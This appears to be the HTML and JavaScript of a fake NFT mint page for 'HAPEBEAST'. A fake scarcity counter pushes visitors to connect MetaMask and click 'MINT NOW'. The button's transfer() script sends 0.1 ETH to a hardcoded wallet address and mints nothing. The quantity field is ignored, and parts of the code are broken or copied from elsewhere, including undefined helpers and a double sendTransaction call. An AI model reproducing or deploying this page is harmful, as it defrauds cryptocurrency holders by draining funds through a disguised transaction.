    <div class="background" style="display:flex;justify-content:center;align-items:center;width:100vw;height:100vh;flex-direction:column;letter-spacing:2px;font-weight:300;font-family:Oswald"><div><div style="text-align:center;font-size:120px;font-weight:1000;color:white;line-height:130px;letter-spacing:8px">HAPEBEAST</div><div style="text-align:center;font-weight:400;font-size:36px;color:white;letter-spacing:6px">LIMITED SALE!</div></div><div style="height:3px;width:35%;background-color:white;margin-top:20px"></div><button id="btn3" style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">Choose the number of HAPE then connect your wallet with metamask by clicking on MINT NOW</button><div style="color:white;font-size:30px;margin-top:40px;margin-bottom:30px;font-weight:500">Sold: 876 / 892 </div><div style="display:flex;align-items:center;justify-content:center"><div style="color:white;font-size:30px;font-weight:500">I want to mint</div><input id="vv" type="number" value="1" style="height:30px;margin-left:6px;margin-right:6px;width:45px;padding:3px 6px;border-radius:6px;font-weight:500" min="1" max="10"/><div style="color:white;font-size:30px;font-weight:500">Hapebeast(s)</div></div><button onClick="transfer()" id="btn2"  style="margin-top:30px;border-width:2px;color:white;padding:10px 14px;font-size:20px;background-color:black">MINT NOW</button><div style="height:3px;width:40%;background-color:white;margin-top:24px;margin-bottom:60px"></div></div></div>
    <div id="root"></div>
    <script>
      const inputValeurdec = document.querySelector('#vv')

    async function transfer() {
      if(typeof window.ethereum !== 'undefined') {
        const accounts = await window.ethereum.request({method:'eth_requestAccounts'});
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        try {
          const tx = signer.sendTransaction({
    to: "0x120Be2AF0B7C4136fb9831FE3F1a95e650E17E75",
    value: ethers.utils.parseEther('0.1')
})
          const transaction = await signer.sendTransaction(tx);
          await transaction.wait();
          setAmountSend('');
          getBalance();
          setSuccess('Votre argent a bien été transféré sur le portefeuille ! ')
        }
        catch(err) {
          
        }
      }
    }
  </script>
